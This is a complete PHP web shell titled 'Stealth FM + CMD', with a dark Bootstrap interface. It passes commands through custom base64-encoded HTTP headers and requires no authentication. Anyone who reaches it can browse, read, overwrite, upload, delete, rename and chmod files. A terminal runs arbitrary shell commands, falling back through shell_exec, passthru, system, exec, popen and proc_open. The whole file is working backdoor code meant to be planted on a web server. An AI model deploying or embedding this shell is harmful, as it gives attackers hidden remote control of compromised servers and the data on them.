<?php
// -------------------------------------------------------------------------
// SERVER SIDE (Stealth API + CMD)
// -------------------------------------------------------------------------
ini_set('display_errors', 0);
ini_set('log_errors', 1);

$h_act  = 'HTTP_X_ACTION';
$h_path = 'HTTP_X_PATH';
$h_data = 'HTTP_X_DATA'; // Rename to, Chmod val
$h_cmd  = 'HTTP_X_CMD';  // Command payload

$root = realpath(__DIR__); 

if (isset($_SERVER[$h_act])) {
    $action = $_SERVER[$h_act];
    $raw_path = isset($_SERVER[$h_path]) ? base64_decode($_SERVER[$h_path]) : '';
    $req_path = str_replace(['../', '..\\'], '', $raw_path);
    $req_path = ltrim($req_path, '/\\');
    $target = $root . ($req_path ? DIRECTORY_SEPARATOR . $req_path : '');
    
    // -- 1. LIST --
    if ($action === 'list') {
        if (!is_dir($target)) { $target = $root; $req_path = ''; }
        $items = scandir($target);
        $dirs = []; $files = [];
        foreach ($items as $i) {
            if ($i == '.' || $i == '..') continue;
            $path = $target . DIRECTORY_SEPARATOR . $i;
            $isDir = is_dir($path);
            $item = [
                'name' => $i,
                'type' => $isDir ? 'dir' : 'file',
                'size' => $isDir ? '-' : human_filesize(filesize($path)),
                'perm' => substr(sprintf('%o', fileperms($path)), -4),
                'write'=> is_writable($path), 
                'date' => date("Y-m-d H:i", filemtime($path))
            ];
            if ($isDir) $dirs[] = $item; else $files[] = $item;
        }
        usort($dirs, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
        usort($files, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
        json_out(['path' => $req_path, 'items' => array_merge($dirs, $files)]);
    }

    // -- 2. READ --
    if ($action === 'read') {
        if (is_file($target)) echo file_get_contents($target); else echo "Err: Not a file"; exit;
    }

    // -- 3. WRITE (UPLOAD/SAVE) --
    if ($action === 'save' || $action === 'upload') {
        $input = file_get_contents("php://input");
        echo (file_put_contents($target, $input) !== false) ? "Success" : "Err: Write failed"; exit;
    }

    // -- 4. DELETE --
    if ($action === 'delete') {
        if (is_file($target)) echo unlink($target) ? "Deleted" : "Fail";
        elseif (is_dir($target)) echo rmdir($target) ? "Deleted" : "Fail"; exit;
    }

    // -- 5. RENAME --
    if ($action === 'rename') {
        $n = isset($_SERVER[$h_data]) ? base64_decode($_SERVER[$h_data]) : '';
        if ($n) echo rename($target, dirname($target).DIRECTORY_SEPARATOR.$n) ? "Renamed" : "Fail"; exit;
    }

    // -- 6. CHMOD --
    if ($action === 'chmod') {
        $m = isset($_SERVER[$h_data]) ? $_SERVER[$h_data] : '';
        if ($m) echo chmod($target, octdec($m)) ? "Chmod OK" : "Fail"; exit;
    }

    // -- 7. CMD (TERMINAL) --
    if ($action === 'cmd') {
        $cmd = isset($_SERVER[$h_cmd]) ? base64_decode($_SERVER[$h_cmd]) : 'whoami';
        
        // Pindah ke direktori target dulu agar command berjalan di folder yang benar
        if(is_dir($target)) chdir($target);
        elseif(is_file($target)) chdir(dirname($target));

        $cmd = $cmd . " 2>&1"; // Redirect stderr
        $out = ""; $done = false;

        // Fallback Logic
        if(function_exists('shell_exec')) { $out = @shell_exec($cmd); $done=true; }
        if(!$done && function_exists('passthru')) { ob_start(); @passthru($cmd); $out = ob_get_clean(); $done=true; }
        if(!$done && function_exists('system')) { ob_start(); @system($cmd); $out = ob_get_clean(); $done=true; }
        if(!$done && function_exists('exec')) { $a=[]; @exec($cmd,$a); $out = implode("\n",$a); $done=true; }
        if(!$done && function_exists('popen')) { $h=@popen($cmd,'r'); if($h){ while(!feof($h))$out.=fread($h,1024); pclose($h); $done=true; } }
        if(!$done && function_exists('proc_open')) {
            $p = @proc_open($cmd, [1=>['pipe','w'],2=>['pipe','w']], $io);
            if($p){ $out=stream_get_contents($io[1]); fclose($io[1]); fclose($io[2]); proc_close($p); $done=true; }
        }

        echo $out ?: "[No Output / Exec Disabled]";
        exit;
    }
}

function json_out($data) { header('Content-Type: application/json'); echo json_encode($data); exit; }
function human_filesize($bytes, $dec = 2) {
    $size = array('B', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$dec}f", $bytes / pow(1024, $factor)) . @$size[$factor];
}
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Stealth FM + CMD</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root { --bg-dark: #121212; --bg-card: #1e1e1e; --border: #333; }
        body { background-color: var(--bg-dark); font-family: 'Segoe UI', Tahoma, sans-serif; font-size: 0.9rem; padding-bottom: 50px; }
        
        /* Navbar */
        .navbar { background-color: var(--bg-card); border-bottom: 1px solid var(--border); height: 60px; }
        .path-display { font-family: monospace; color: #ccc; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }

        /* Icons & Perms */
        .badge-perm { font-family: monospace; cursor: pointer; font-size: 0.8rem; }
        .icon-dir { color: #f1c40f; } .icon-file { color: #3498db; }
        .btn-icon { width: 32px; height: 32px; display: inline-flex; align-items: center; justify-content: center; border-radius: 6px; border: none; transition: 0.2s; }
        .btn-edit { background: rgba(52, 152, 219, 0.15); color: #3498db; }
        .btn-del { background: rgba(231, 76, 60, 0.15); color: #e74c3c; }

        /* Editor Styles */
        #editor-area { font-family: 'Consolas', 'Monaco', monospace; font-size: 14px; background: #151515; color: #eee; border: 1px solid #333; outline: none; resize: none; }

        /* TERMINAL STYLES */
        #term-output { font-family: 'Consolas', monospace; font-size: 13px; white-space: pre-wrap; color: #0f0; min-height: 300px; padding-bottom: 10px; }
        .term-input-line { display: flex; align-items: center; border-top: 1px solid #333; padding-top: 10px; }
        #term-cmd { background: transparent; border: none; color: #fff; width: 100%; outline: none; font-family: 'Consolas', monospace; margin-left: 10px; }
        .prompt-char { color: #00bfff; font-weight: bold; }

        /* --- DESKTOP TWEAKS --- */
        @media (min-width: 768px) {
            .modal-xl { max-width: 90%; }
            .modal-body.editor-body { height: 75vh; }
            .modal-body.term-body { height: 70vh; overflow-y: auto; background: #0c0c0c; }
            #editor-area { height: 100% !important; }
            .desktop-toolbar { display: flex; align-items: center; justify-content: space-between; }
            .upload-group { width: auto; max-width: 350px; }
        }

        /* --- MOBILE TWEAKS --- */
        @media (max-width: 767px) {
            .d-mobile-none { display: none !important; }
            .mobile-name { display: block; max-width: 180px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
            .modal-dialog { margin: 0; max-width: 100%; height: 100%; }
            .modal-content { height: 100%; border-radius: 0; }
            .modal-body { flex-grow: 1; padding: 0; }
            .modal-body.term-body { background: #0c0c0c; padding: 10px; height: calc(100vh - 60px); overflow-y: auto; }
            #editor-area { border: none; height: 100% !important; }
            .desktop-toolbar { display: block; }
            .upload-group { width: 100%; margin-top: 10px; }
        }
    </style>
</head>
<body>

<nav class="navbar fixed-top shadow-sm">
    <div class="container-fluid flex-nowrap gap-3">
        <a class="navbar-brand text-light d-flex align-items-center me-0" href="#">
            <i class="fas fa-ghost me-2"></i>
            <span class="fw-bold d-none d-md-inline">Stealth<span class="text-primary">FM</span></span>
        </a>

        <div class="d-flex gap-2">
            <button class="btn btn-outline-secondary btn-sm" onclick="loadDir('')" title="Root"><i class="fas fa-home"></i></button>
            <button class="btn btn-outline-secondary btn-sm" onclick="loadDir('..')" title="Up"><i class="fas fa-level-up-alt"></i></button>
            <button class="btn btn-outline-success btn-sm" onclick="openTerm()" title="Terminal"><i class="fas fa-terminal"></i></button>
        </div>

        <div class="d-flex align-items-center flex-grow-1 bg-dark rounded border border-secondary px-3 py-1" style="height: 34px; min-width: 0;">
            <i class="fas fa-folder-open me-2 text-warning small"></i>
            <div id="path-txt" class="path-display">/</div>
        </div>
    </div>
</nav>

<div class="container-fluid" style="margin-top: 80px;">
    <div class="card bg-card border-secondary shadow">
        <div class="card-header bg-transparent border-secondary py-3 desktop-toolbar">
            <div class="text-light fw-bold mb-2 mb-md-0 d-flex align-items-center">
                <i class="fas fa-list me-2 text-primary"></i> Files
            </div>
            <div class="input-group input-group-sm upload-group">
                <input type="file" id="uploadInput" class="form-control bg-secondary text-light border-secondary">
                <button class="btn btn-primary" onclick="uploadFile()" id="btnUpload">
                    <i class="fas fa-cloud-upload-alt"></i> Upload
                </button>
            </div>
        </div>

        <div class="table-responsive">
            <table class="table table-hover align-middle mb-0 text-light">
                <thead class="table-dark">
                    <tr>
                        <th class="ps-3">Name</th>
                        <th class="d-mobile-none">Size</th>
                        <th class="text-center">Perms</th>
                        <th class="d-mobile-none">Date</th>
                        <th class="text-end pe-3">Action</th>
                    </tr>
                </thead>
                <tbody id="fileList"></tbody>
            </table>
        </div>
    </div>
</div>

<div class="modal fade" id="editModal" tabindex="-1" data-bs-backdrop="static">
    <div class="modal-dialog modal-xl modal-dialog-centered modal-dialog-scrollable">
        <div class="modal-content bg-card border-secondary text-light">
            <div class="modal-header border-secondary py-2">
                <h6 class="modal-title" id="editFileName"><i class="fas fa-edit me-2"></i>Edit</h6>
                <div class="d-flex gap-2 ms-auto">
                    <button type="button" class="btn btn-sm btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-sm btn-primary" onclick="saveFile()" id="btnSave">Save</button>
                </div>
            </div>
            <div class="modal-body editor-body p-0">
                <textarea id="editor-area" class="form-control rounded-0" spellcheck="false"></textarea>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="termModal" tabindex="-1">
    <div class="modal-dialog modal-xl modal-dialog-centered">
        <div class="modal-content bg-card border-secondary text-light">
            <div class="modal-header border-secondary py-2 bg-dark">
                <h6 class="modal-title text-success"><i class="fas fa-terminal me-2"></i>Terminal Console</h6>
                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
            </div>
            <div class="modal-body term-body">
                <div id="term-output">
                    <div style="color:#888;"># Stealth Shell Ready. Commands executed in current dir.</div>
                </div>
                <div class="term-input-line">
                    <span class="prompt-char">➜</span>
                    <input type="text" id="term-cmd" placeholder="Type command..." autocomplete="off">
                </div>
            </div>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
    let currentPath = '', currentFile = '';
    const editModal = new bootstrap.Modal(document.getElementById('editModal'));
    const termModal = new bootstrap.Modal(document.getElementById('termModal'));

    async function api(action, path, method = 'GET', extraHeaders = {}, body = null) {
        let headers = { 'X-Action': action, 'X-Path': btoa(path), ...extraHeaders };
        return fetch(window.location.href, { method, headers, body });
    }

    // --- FM Logic ---
    function loadDir(path) {
        let target = currentPath;
        if (path === '..') target = target.includes('/') ? target.substring(0, target.lastIndexOf('/')) : '';
        else if (path !== '') target = target ? target + '/' + path : path;
        else target = '';

        api('list', target).then(r => r.json()).then(res => {
            currentPath = res.path;
            document.getElementById('path-txt').innerText = res.path || '/';
            renderTable(res.items);
        }).catch(() => alert('Network Error'));
    }

    function renderTable(items) {
        const tbody = document.getElementById('fileList');
        tbody.innerHTML = '';
        if (!items.length) { tbody.innerHTML = '<tr><td colspan="5" class="text-center py-4 text-muted">Empty Directory</td></tr>'; return; }

        items.forEach(f => {
            let isDir = f.type === 'dir';
            let icon = isDir ? '<i class="fas fa-folder icon-dir me-2"></i>' : '<i class="fas fa-file-code icon-file me-2"></i>';
            let click = isDir ? `loadDir('${f.name}')` : `openEditor('${f.name}')`;
            let pColor = f.write ? 'bg-success' : 'bg-danger';
            
            tbody.innerHTML += `
                <tr>
                    <td class="ps-3"><a onclick="${click}" class="text-decoration-none text-light cursor-pointer mobile-name fw-bold">${icon}${f.name}</a></td>
                    <td class="d-mobile-none text-muted"><small>${f.size}</small></td>
                    <td class="text-center"><span onclick="chmodItem('${f.name}', '${f.perm}')" class="badge ${pColor} badge-perm">${f.perm}</span></td>
                    <td class="d-mobile-none text-muted"><small>${f.date}</small></td>
                    <td class="text-end pe-3">
                        <button class="btn-icon btn-edit me-1" onclick="renameItem('${f.name}')"><i class="fas fa-pen"></i></button>
                        <button class="btn-icon btn-del" onclick="deleteItem('${f.name}')"><i class="fas fa-trash"></i></button>
                    </td>
                </tr>`;
        });
    }

    // --- Actions ---
    function openEditor(name) {
        currentFile = currentPath ? currentPath + '/' + name : name;
        api('read', currentFile).then(r => r.text()).then(txt => {
            document.getElementById('editFileName').innerHTML = `<i class="fas fa-file-code me-2"></i> ${name}`;
            document.getElementById('editor-area').value = txt;
            editModal.show();
        });
    }
    function saveFile() {
        let btn = document.getElementById('btnSave'); let old = btn.innerHTML; btn.innerHTML = 'Saving...';
        api('save', currentFile, 'PUT', {}, document.getElementById('editor-area').value).then(r => r.text()).then(m => { 
            alert(m); editModal.hide(); btn.innerHTML = old;
        });
    }
    function uploadFile() {
        let input = document.getElementById('uploadInput'); if (!input.files.length) return;
        let btn = document.getElementById('btnUpload'); let old = btn.innerHTML; btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
        let path = currentPath ? currentPath + '/' + input.files[0].name : input.files[0].name;
        api('upload', path, 'PUT', {}, input.files[0]).then(r => r.text()).then(m => {
            alert(m); input.value = ''; btn.innerHTML = old; loadDir('');
        });
    }
    function deleteItem(name) { if(confirm(`Del ${name}?`)) api('delete', currentPath ? currentPath + '/' + name : name, 'DELETE').then(() => loadDir('')); }
    function renameItem(name) { let n = prompt("New name:", name); if (n && n !== name) api('rename', currentPath ? currentPath + '/' + name : name, 'GET', {'X-Data': btoa(n)}).then(r => { alert(r.text()); loadDir(''); }); }
    function chmodItem(name, p) { let n = prompt("Chmod:", "0"+p); if (n) api('chmod', currentPath ? currentPath + '/' + name : name, 'GET', {'X-Data': n}).then(() => loadDir('')); }

    // --- TERMINAL LOGIC ---
    function openTerm() { termModal.show(); setTimeout(() => document.getElementById('term-cmd').focus(), 500); }
    
    document.getElementById('term-cmd').addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            let cmd = this.value; if(!cmd) return;
            let outDiv = document.getElementById('term-output');
            
            // Tampilkan perintah di layar
            outDiv.innerHTML += `<div><span style="color:#00bfff;">➜</span> <span style="color:#fff;">${cmd}</span></div>`;
            this.value = '';
            
            // Scroll ke bawah
            let modalBody = document.querySelector('.term-body');
            modalBody.scrollTop = modalBody.scrollHeight;

            // Kirim request CMD
            api('cmd', currentPath, 'GET', { 'X-Cmd': btoa(cmd) }).then(r => r.text()).then(res => {
                outDiv.innerHTML += `<div style="color:#ccc; margin-bottom:10px;">${res}</div>`;
                modalBody.scrollTop = modalBody.scrollHeight;
            });
        }
    });

    loadDir('');
</script>
</body>
</html>
